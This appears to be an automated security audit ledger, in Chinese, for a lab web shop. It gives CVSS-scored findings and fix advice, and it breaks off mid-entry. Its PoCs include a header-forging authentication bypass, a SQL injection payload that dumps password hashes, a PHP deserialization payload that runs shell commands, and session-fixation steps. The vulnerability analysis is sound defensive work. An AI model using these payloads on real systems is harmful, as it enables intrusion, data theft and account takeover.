| PR | N | line 2 未调用 require_user，校验仅依赖请求头，无需登录 | lab30-shop/app/public/ops/maintenance.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-37 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无他人参与 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用权限边界内 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 仅写入作业并返回 job_id，无读取他人数据 | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可向 jobs 表插入作业记录 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无明显可用性破坏证据 | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'maintenance_header_bypass.sh', 'language': 'bash', 'script': "curl -i -X POST 'http://TARGET/ops/maintenance.php' -H 'X-Admin: 1'", 'instructions': '将 TARGET 替换为部署地址，直接发送伪造头，无需登录 Cookie。', 'normal_input': "curl -i 'http://TARGET/ops/maintenance.php'", 'attack_input': "curl -i -X POST 'http://TARGET/ops/maintenance.php' -H 'X-Admin: 1'", 'expected_result': '无头请求返回 403；带 X-Admin:1 的 POST 返回 accepted:true 与 job_id，说明鉴权被绕过并入队。'}
````


### 台账 `091c46f66cf544a497a7ff8895c1bd24`

- ops/members.php 将 GET 参数 q 直接拼入 member_lookup 的 LIKE SQL，造成 SQL 注入（CVSS 3.1 Base 8.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `e172e33845464679a59726ee3e8d53ee` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 2, 'end_line': 4}]
  结论：member_lookup() 用 "... LIKE '%" . $term . "%'" 拼接查询串；ops/members.php 第 2 行取 $_GET['q'] 强制转 string 后直接调用，未使用 prepare/占位符，也无白名单过滤，返回结果还会以 JSON 或 HTML 表格回显，构成可回显的 SQL 注入。
  输入：HTTP GET 参数 q
  传播：$_GET['q'] -> (string)$term -> member_lookup($term) -> 字符串拼接进 query()
  危险操作：db()->query() 执行含外部输入的 SQL
  保护：bootstrap.php:6 虽设置 EMULATE_PREPARES=false，但该调用完全绕过 prepare；require_user 仅限制角色，不处理注入数据
  前提：['攻击者持有 operator 或 admin 角色账号']
  修复建议：改用 db()->prepare('... WHERE username LIKE ?') 并绑定 '%'.$term.'%'，必要时对 %/_ 转义。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:39:54.082863+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | ops 页面通过 HTTP 访问 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 简单单引号闭合即可注入，无需特殊条件 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user(['operator','admin']) 需要已登录的运营/管理员账号 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身发起请求 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅在数据库查询上下文中 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可查询 users 表任意列（含密码哈希等其他表） | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | IN 子查询/堆叠视驱动，同语句可影响数据（联合注入数据由 fetchAll 返回并显示） | lab30-shop/app/public/ops/members.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未证实可用性破坏 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'members_sqli.sh', 'language': 'bash', 'script': '#!/bin/bash\n# 需先登录为 operator/admin，保存 cookie\ncurl -s -H \'Cookie: SHOPSESSID=<operator_sid>\' -H \'Accept: application/json\' "http://TARGET/ops/members.php?q=%25\'%20UNION%20SELECT%201,username,password_hash,role%20FROM%20users--%20-"\n', 'instructions': '将 TARGET 替换为部署地址，使用运营账号 Cookie 请求 URL；正常输入 q=alice 只返回匹配用户，攻击输入返回全部用户（含敏感列）。', 'normal_input': 'q=alice', 'attack_input': "q=' UNION SELECT 1,username,password_hash,role FROM users-- -", 'expected_result': '正常输入仅返回包含 alice 的行；攻击输入返回全表或多出非匹配行，证明注入生效。'}
````


### 台账 `285a63c96dbd4854a362102c7f92e2c6`

- ops/jobs.php 对用户提交的 base64 数据执行 unserialize，DispatchJob::__wakeup 中 shell_exec 造成 RCE（CVSS 3.1 Base 9.9 (critical) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H，验证：unverified）
  来源 `20935a5846c8435aafabe093ddc6b347` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/jobs.php', 'start_line': 2, 'end_line': 5}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 1, 'end_line': 5}]
  结论：ops/jobs.php:3 将 $_POST['job'] 做 base64_decode 后立即 unserialize，且 instanceof 检查在反序列化之后；dispatch_job.php:4 的 __wakeup() 执行 shell_exec($this->command)，command 属性为 public 可被攻击者序列化控制，因此 POST 一个序列化的 DispatchJob 即可在服务器执行任意命令，输出还被写入 jobs.details 并在页面回显。
  输入：HTTP POST 参数 job（base64 编码的序列化对象）
  传播：$_POST['job'] -> base64_decode -> unserialize -> DispatchJob::__wakeup -> shell_exec($this->command)
  危险操作：unserialize 触发 __wakeup 中的 shell_exec 系统命令执行
  保护：check_csrf 与 require_user(['operator','admin']) 只限制身份与请求来源，不限制序列化内容；instanceof 检查在 unserialize 之后执行，无法阻止 __wakeup 触发
  前提：['攻击者持有 operator 或 admin 账号，能获取有效 CSRF token（页面直接提供示例）']
  修复建议：不要反序列化用户输入；改用 JSON/白名单字段。若必须，使用 unserialize($raw, ['allowed_classes'=>['DispatchJob']]) 并移除 shell_exec，改为受控白名单任务映射。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:39:54.084156+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP POST 触发 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造可序列化的 DispatchJob 对象并 base64 编码 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/dispatch_job.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 账号且通过 CSRF 校验 | lab30-shop/app/public/ops/jobs.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自己提交 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | C | 从 Web 应用越界到操作系统命令执行 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | shell_exec 输出回显，可执行任意读取系统信息命令 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/public/ops/jobs.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可执行任意写命令/脚本 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 可执行破坏性命令 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'jobs_rce.sh', 'language': 'bash', 'script': '#!/bin/bash\n# 生成 payload: O:11:"DispatchJob":1:{s:7:"command";s:2:"id";}\nPAYLOAD=$(printf \'O:11:"DispatchJob":1:{s:7:"command";s:2:"id";}\' | base64 -w0)\ncurl -s -H \'Cookie: SHOPSESSID=<operator_sid>\' -X POST --data "csrf=<csrf>&job=$PAYLOAD" http://TARGET/ops/jobs.php\n', 'instructions': '登录运营账号，从 /ops/jobs.php 页面提取 csrf token，提交上述 payload；正常任务为 printf inventory-ready，攻击 payload 执行 id 命令。', 'normal_input': 'job=<base64 of serialize(new DispatchJob())>', 'attack_input': 'base64(\'O:11:"DispatchJob":1:{s:7:"command";s:2:"id";}\')', 'expected_result': '正常任务输出 inventory-ready；攻击 payload 后页面 <pre> 与 jobs 表中出现 id 命令的 uid/gid 输出。'}
````


### 台账 `d01e792db72b4fd4a928d6d4bdc6e23e`

- account/backup.php 对 base64 解码的 backup 直接 unserialize，可伪造 MemberBackup.tier 提升会员等级（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：unverified）
  来源 `9dc0c00285094ed8af05fde3cab0b3a9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 1, 'end_line': 8}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：backup.php:4-5 对 base64 解码后的 $_POST['backup'] 直接 unserialize()，仅用 instanceof MemberBackup 校验对象类型；backup.php:6 将反序列化对象的 tier 与 displayName 写入当前用户记录。src/backup.php:2-5 显示 MemberBackup 为普通公有属性类，攻击者可提交 base64_encode(serialize(new MemberBackup 实例并将 tier 设为 premium)) 实现权益篡改。instanceof 只能阻止其他类/非对象，无法约束属性值。
  输入：POST 参数 backup（base64 编码序列化串）
  传播：base64_decode -> unserialize -> $restored->tier/$restored->displayName
  危险操作：UPDATE users SET tier=?,display_name=? WHERE id=?
  保护：仅 instanceof MemberBackup 校验与 CSRF 检查；无序列化签名/属性白名单
  前提：['攻击者注册普通账号并取得登录会话及 csrf token']
  修复建议：不要对用户提交数据 unserialize；改用 JSON 并显式只读取 allowlist 字段，同时对 tier 等权益字段服务端校验，必要时加 HMAC 签名。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:40:55.837124+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 表单远程可达 | lab30-shop/app/public/account/backup.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 攻击者只需构造序列化串并 base64 编码 | lab30-shop/app/src/backup.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需注册登录会话与 CSRF token | lab30-shop/app/public/account/backup.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:40-40 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者操作自己的会话 | lab30-shop/app/public/account/backup.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响同一应用用户表记录 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 仅写入自身账户字段 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可任意设置 tier 会员权益字段 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/backup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'backup_tier_poc.php', 'language': 'php', 'script': "<?php\n// 生成伪造备份串，手工替换 target 域名\nclass MemberBackup { public string $tier='standard'; public string $displayName='会员'; }\n$o=new MemberBackup(); $o->tier='premium'; $o->displayName='attacker';\necho base64_encode(serialize($o));\n", 'instructions': '登录普通账号 GET /account/backup.php 抓取 csrf 与 cookie，运行脚本得到 payload，POST backup=<payload>&csrf=<token> 到 /account/backup.php，随后 GET /account/me.php 查看 tier 是否变为 premium。', 'normal_input': 'backup=页面提供的原始备份（tier=standard）', 'attack_input': "backup=base64(serialize(MemberBackup{tier:'premium',displayName:'attacker'}))", 'expected_result': '恢复后 account/me.php 返回 tier=premium，而普通备份保持 standard'}
````


### 台账 `7a7c9aa285264af193bc5afacc7008f1`

- member_lookup() 将 ops/members.php 的 GET 参数 q 直接拼入 LIKE SQL 造成 SQL 注入（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N，验证：unverified）
  来源 `3e4a527217f84da7a4393bc6e1abc5ad` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 7}]
  结论：ops/members.php:2 以 require_user(['operator','admin']) 通过后取 (string)($_GET['q']??'alice') 传给 member_lookup()，member_lookup.php:3 直接将该字符串拼接进 "... WHERE username LIKE '%" . $term . "%'" 并 db()->query() 执行。无参数化、无转义，攻击者可闭合引号构造联合查询读取 users 等表数据。
  输入：HTTP GET 参数 q（ops/members.php:2）
  传播：$_GET['q'] -> (string)$term -> member_lookup($term) -> 字符串拼接 SQL -> db()->query() 执行
  危险操作：PDO::query() 执行含外部输入的 SQL 语句
  保护：仅 require_user(['operator','admin']) 的粗粒度角色校验；查询无预处理/转义（bootstrap.php:6 关闭 EMULATE_PREPARES 也无济于事，因未使用 prepare）
  前提：['攻击者拥有 operator 或 admin 角色账号并被允许访问 /ops/members.php']
  修复建议：改用 db()->prepare('... LIKE ?') 并 execute(['%'.$term.'%'])，同时对通配符做转义。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:41:39.579962+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可远程访问 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 单次 GET 请求即可注入，无需特殊条件 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 角色账号（源码 require_user 限定） | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自身发起请求 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于数据库内数据 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可联合查询读取 users 表全部字段（密码/邮箱等） | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 同 query() 上下文可执行写操作，但源码未直接体现 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏可用性证据 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_members_like.sh', 'language': 'bash', 'script': '#!/bin/bash\n# 需先以 operator 登录并取得 SHOPSEESID cookie\ncurl -s -b \'SHOPSESSID=<session>\' --data-urlencode "q=\' UNION SELECT id,username,password_hash,role FROM users-- -" \'http://TARGET/ops/members.php?q=1\' -G -H \'Accept: application/json\'\n', 'instructions': '以 operator 账号登录获取会话 Cookie，然后向 /ops/members.php 发送携带注入载荷的 GET 请求 q 参数；服务端会将其拼入 members 查询。', 'normal_input': 'q=alice', 'attack_input': "q=' UNION SELECT id,username,email,role FROM users-- -", 'expected_result': '正常 q=alice 仅返回用户名包含 alice 的行；注入载荷返回 users 表其它行（例如 admin 账号）或 SQL 报错，证明 SQL 注入。'}
````


### 台账 `a403db352e9046b78830de823311d99f`

- jobs.php 对用户 base64 反序列化并结合 DispatchJob::__wakeup 执行 shell 命令（CVSS 3.1 Base 7.2 (high) · CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H，验证：unverified）
  来源 `9d704f2d68f844b1afc9849fa95601a9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/jobs.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/src/dispatch_job.php', 'start_line': 2, 'end_line': 4}]
  结论：jobs.php 对 POST 参数 job 进行 base64_decode 后直接 unserialize；dispatch_job.php 的 DispatchJob::__wakeup 调用 shell_exec($this->command)。攻击者可提交序列化 DispatchJob 并设置 command 为任意系统命令，触发反序列化时的 __wakeup 执行命令。虽然 jobs.php 中 check_csrf 存在，但反序列化本身即危险 sink，且无白名单。
  输入：POST 参数 job（base64 编码的序列化对象）
  传播：base64_decode -> unserialize -> DispatchJob::__wakeup -> shell_exec($this->command)
  危险操作：unserialize 用户数据触发 shell_exec
  保护：check_csrf 与 instanceof DispatchJob 校验，但不限制 command 字段，无法阻止命令注入
  前提：['攻击者需通过 require_user 进入 ops 页面且能提交 POST；CSRF token 可获取']
  修复建议：禁用 unserialize 用户输入，改用 JSON；对 command 使用固定命令白名单，杜绝 shell_exec。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:41:59.858729+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 访问 /ops/jobs.php | lab30-shop/docker/apache.conf:2-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接构造 base64 serialize 的 DispatchJob 即可 | lab30-shop/app/src/dispatch_job.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | H | 需要 operator/admin 或可访问 ops 的账户 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行提交 | lab30-shop/app/public/ops/jobs.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在 Web 进程内执行 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 任意命令执行可读取敏感数据 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 任意命令可修改系统 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏服务 | lab30-shop/app/src/dispatch_job.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `20aed7944bfc4cc9b4829578900d9f61`

- ops/maintenance.php 仅凭可伪造 X-Admin:1 请求头通过服务身份校验并非授权写入 jobs 表（CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N，验证：unverified）
  来源 `3e98d5e9dca24b51a89951ada5c824d7` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：maintenance.php 第 3 行只用 $_SERVER['HTTP_X_ADMIN']==='1' 判断服务身份，第 4 行在 POST 时未经 require_user/check_csrf 直接向 jobs 表插入记录。HTTP 请求头由客户端完全控制，攻击者无需登录发送 X-Admin: 1 并 POST 即可触发写入并获取 job_id，构成认证绕过与越权敏感操作。
  输入：HTTP 请求头 X-Admin 及 POST 方法
  传播：第 3 行头校验通过 -> 第 4 行 POST 分支执行 prepare/execute 插入 jobs
  危险操作：向 jobs 表插入作业记录并回显 lastInsertId
  保护：仅有客户端可控头比较，无会话、角色或 CSRF 校验
  前提：['可直接访问 /ops/maintenance.php 并发 POST']
  修复建议：移除基于请求头的信任，改用服务端会话/角色校验或强签名服务凭据，并对写操作实施 CSRF 与鉴权。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:42:43.100594+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可直接访问 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需发送 X-Admin: 1 头 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无 require_user 或会话校验 | lab30-shop/app/public/ops/maintenance.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者直接发请求 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仅影响作业表写入 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | GET 仅返回固定服务信息 | lab30-shop/app/public/ops/maintenance.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可插入 jobs 记录 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接破坏可用性证据 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'maintenance_bypass.sh', 'language': 'bash', 'script': "curl -i -X POST http://TARGET/ops/maintenance.php -H 'X-Admin: 1'", 'instructions': '将 TARGET 替换为目标主机，发送 POST 请求带 X-Admin: 1。', 'normal_input': '不带 X-Admin 头访问', 'attack_input': 'X-Admin: 1 的 POST 请求', 'expected_result': '正常请求返回 403；攻击请求返回 accepted:true 与 job_id'}
````


### 台账 `6f0b7788873a412ea84367efbd5acc46`

- auth/login.php 从 GET sid 接受外部会话 ID 且登录后不轮换，导致会话固定（CVSS 3.1 Base 6.8 (medium) · CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `440e66882854456cbd22b4ba0732f649` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/auth/login.php', 'start_line': 3, 'end_line': 9}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 11, 'end_line': 18}]
  结论：login.php 第 3 行将 $_GET['sid'] 传入 start_session()；bootstrap 第 13 行关闭 session.use_strict_mode，第 17 行在格式合法时直接 session_id($sid)，第 18 行启动会话。第 7-9 行认证成功后仅写入 $_SESSION['user_id'] 并跳转，没有 session_regenerate_id()，攻击者预设的固定会话 ID 在受害者登录后仍有效，从而劫持会话。
  输入：GET 参数 sid
  传播：$_GET['sid'] -> session_id() -> session_start()；认证成功后沿用同一 ID
  危险操作：使用外部可控会话标识建立认证会话且不轮换
  保护：正则仅限制字符格式，use_strict_mode=0 允许未存在 ID，Cookie httponly/samesite 不能阻止固定
  前提：['攻击者诱导受害者访问带 sid 的登录链接并在该会话完成登录']
  修复建议：启用 session.use_strict_mode=1，拒绝从请求参数接收会话 ID，登录成功后调用 session_regenerate_id(true)。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:42:43.101503+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过链接/请求访问登录页 | lab30-shop/app/public/auth/login.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需诱导受害者在预设会话中完成登录 | lab30-shop/app/public/auth/login.php:3-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 攻击者无需登录 | lab30-shop/app/public/auth/login.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者在同一会话完成登录 | lab30-shop/app/public/auth/login.php:5-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 会话劫持仍属同一应用边界内 | lab30-shop/app/public/auth/login.php:8-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可接管受害者已认证会话读取其账户数据 | lab30-shop/app/src/bootstrap.php:22-24 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可代表受害者执行写操作 | lab30-shop/app/public/auth/login.php:8-8 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性破坏依据 | lab30-shop/app/public/auth/login.php:3-9 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'session_fixation.txt', 'language': 'text', 'script': '1) 攻击者设置 sid=aaaaaaaaaaaaaaaa 的链接 http://TARGET/auth/login.php?sid=aaaaaaaaaaaaaaaa\n2) 受害者在该页面登录成功\n3) 攻击者用 Cookie SHOPSESSID=aaaaaaaaaaaaaaaa 访问 /account/index.php', 'instructions': '将 TARGET 替换为目标主机，按步骤观察攻击者使用同一 ID 仍为已认证会话。', 'normal_input': '正常不带 sid 登录', 'attack_input': '带固定 sid 的登录链接', 'expected_result': '攻击者使用预设 ID 可访问受害者账户页面'}
````


### 台账 `17d47f6b6cc8418fb411bf5108cb571d`

- ops/database.php 强制连接未配置归档库并将异常消息与调用堆栈回显给运营角色（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N，验证：unverified）
  来源 `34e8963a49ef4ce895904ac6707b542e` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/database.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：database.php 第 3 行根据 GET probe 选择 DSN 库名：probe=archive 时固定为 'shop_archive_unconfigured'，第 3 行直接 new PDO 连接该库。该库未配置，PDO 构造抛异常；catch(Throwable $e) 把 get_class($e)、$e->getMessage() 与 $e->getTraceAsString() 拼入 $output。第 4 行只经 h() HTML 转义后输出到 <pre>，未做错误信息脱敏。任何 operator/admin 会话（含运营账号）都能以 probe=archive 触发并读取内部主机、库名、用户名及调用堆栈。
  输入：GET 参数 probe
  传播：$_GET['probe']==='archive' -> $schema='shop_archive_unconfigured' -> new PDO(...) 抛 PDOException -> catch 拼 getMessage()+getTraceAsString() 到 $output -> 第 4 行 h($output) 输出
  危险操作：将 PDO 异常消息（含 DSN 主机/库/用户名）与调用堆栈原样回显到页面
  保护：仅 require_user(['operator','admin']) 的角色门槛；第 4 行 h() 只做 HTML 转义，不脱敏错误细节与堆栈
  前提：['持有 operator 或 admin 角色会话；GET probe=archive']
